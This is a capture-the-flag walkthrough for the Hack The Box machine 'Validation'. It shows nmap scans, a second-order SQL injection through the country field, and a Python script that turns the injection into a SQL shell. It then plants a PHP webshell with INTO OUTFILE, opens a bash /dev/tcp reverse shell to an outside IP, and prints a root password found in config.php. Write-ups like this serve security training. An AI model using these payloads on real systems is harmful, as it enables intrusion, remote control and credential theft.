# [Validation](https://app.hackthebox.com/machines/Validation)

```bash
nmap -p- --min-rate 10000 10.10.11.116 -Pn
```

![Alt text](img/image.png)

After discovering open ports, let's do greater scan for these open ports.

```bash
nmap -A -sC -sV -p22,80,4566,8080 10.10.11.116
```

![Alt text](img/image-1.png)


Let's see web application on port (80).

![Alt text](img/image-2.png)


I started to `SQLI` payloads by adding quote character, web app doesn't response properly.

![Alt text](img/image-3.png)

I just think that for `country` parameter, I can do SQL Injections while I can enumerate db.

```bash
=Brazil' union select user();-- -
```

I enter this input and results back like this.

![Alt text](img/image-4.png)


It means, it is `Second-order SQL Injection`.


I wrote `Python` script such below.

```python
#!/usr/bin/env python3

import random
import requests
from bs4 import BeautifulSoup
from cmd import Cmd


class Term(Cmd):

    prompt = "> "

    def default(self, args):
        name = f'dr4ks-{random.randrange(1000000,9999999)}'
        resp = requests.post('http://10.10.11.116/',
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data={"username": name, "country": f"' union {args};-- -"})
        soup = BeautifulSoup(resp.text, 'html.parser')
        if soup.li:
            print('\n'.join([x.text for x in soup.findAll('li')]))

    def do_quit(self, args):
        return 1

term = Term()
term.cmdloop()
```


I have proper SQL CLI.

![Alt text](img/image-5.png)


Now, I will try to write some txt data into web application folder ("/var/www/html/dr4ks.txt")

```bash
select "dr4ks was here!" into outfile '/var/www/html/dr4ks.txt'
```

![Alt text](img/image-6.png)


Let's write malicious PHP webshell into here.

![Alt text](img/image-7.png)


Now, I can execute commands from `dr4ks.php` webshell which I upload now.

![Alt text](img/image-8.png)


Now, I will add reverse shell payload  (URL ENCODED) into here.
```bash
bash -c "bash -i >& /dev/tcp/10.10.16.7/1337 0>&1"
```

![Alt text](img/image-9.png)

I got reverse shell from port (1337).

![Alt text](img/image-10.png)


user.txt

![Alt text](img/image-11.png)


I found `config.php` file on '/var/www/html' directory which contains sensitive credentials.

![Alt text](img/image-12.png)


That's the password of `root` user.

root: uhc-9qual-global-pw

root.txt

![Alt text](img/image-13.png)
